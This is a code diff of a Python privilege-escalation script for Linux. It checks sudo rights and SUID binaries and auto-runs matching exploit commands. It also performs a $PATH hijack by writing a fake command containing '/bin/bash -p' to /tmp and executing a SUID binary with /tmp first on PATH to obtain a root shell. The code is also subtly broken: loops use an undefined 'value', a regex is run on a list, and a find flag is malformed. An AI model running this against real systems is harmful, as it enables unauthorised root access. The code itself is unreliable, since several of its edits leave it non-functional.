@@ -99,14 +99,14 @@ def sudo_l():
         last_line.lower()
 
     # loop through dictionaries and print cmds if need user interaction, otherwise execute
-    for key,value in sudo_bins_print:
+    for key in sudo_bins_print:
         if key in last_line:
             print("{}: {}".format(key,value))
             continue
         else:
             continue
 
-    for key,value in sudo_bins_exec:
+    for key in sudo_bins_exec:
         if key in last_line:
             print("{}: {}".format(key,value))
             sudo_cmd = value.strip()
@@ -164,13 +164,13 @@ def suid():
                 print(line)
             else:
                 continue
-        for key,value in suid_bins_print:
+        for key in suid_bins_print:
             if key in suid:
                 print("\n{}: {}".format(key,value))
             else:
                 continue
 
-        for key,value in suid_bins_exec:
+        for key in suid_bins_exec:
             if key in suid:
                 print("\n{}: {}".format(key,value))
                 suid_cmd = value.strip()
@@ -182,6 +182,8 @@ def suid():
 
 # try SUID executables for $PATH exploitation
 def path():
+    print("\n### running strings on SUID executables & searching for cmds w/o fill path (might want to check manually as well)")
+    
     common_cmds = ["base64", "bash", "chmod", "cp", "dig", "docker", "env", "file", "find", "gzip", "mosquitto", "mv", 
     "nmap", "openvpn", "perl", "php", "python", "mysql", "rsync", "strings", "systemctl", "unzip", "vim", "wc", "wget", 
     "zsh", "ls", "ftp", "apache2", "apache", "ssh", "ps", "ss", "cat", "touch", "mkdir", "cd", "rm", "nc", "service", 
@@ -189,18 +191,17 @@ def path():
     "git", "gh", "vi", "nano"]
 
     os.system("mkdir /tmp/.path/")
-    print("finding SUID executables that don't specify full path (for $PATH exploit)")
+    print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###")
     os.system("find / type f -perm /4000 2>/dev/null | tee /tmp/pwd.txt")
     with open("/tmp/pwd.txt") as root_files:
         lines = root_files.readlines()
         for line in lines:
             split_path = line.split("/")
-            os.system("strings {} > /tmp/.path/root_{}".format(line,plit_path[-1]))
-            print("\n### running strings on SUID executables & searching for cmds w/o fill path (might want to check manually as well)")
-            strings_file = open(f"/tmp/.path/root_{split_path[-1]}")
+            os.system("strings {} > /tmp/.path/root_{}".format(line,split_path[-1]))
+            strings_file = open("/tmp/.path/root_{}".format(split_path[-1]))
             lines_strings = strings_file.readlines()
             for cmd in common_cmds:
-                non_path_cmd = re.search(f"\\s{cmd}\\s", lines_strings)
+                non_path_cmd = re.search("\\s{}\\s".format(cmd), lines_strings)
                 if non_path_cmd:
                     print("\n### {} does not specify full path of {} ###".format(line,cmd))
                     os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
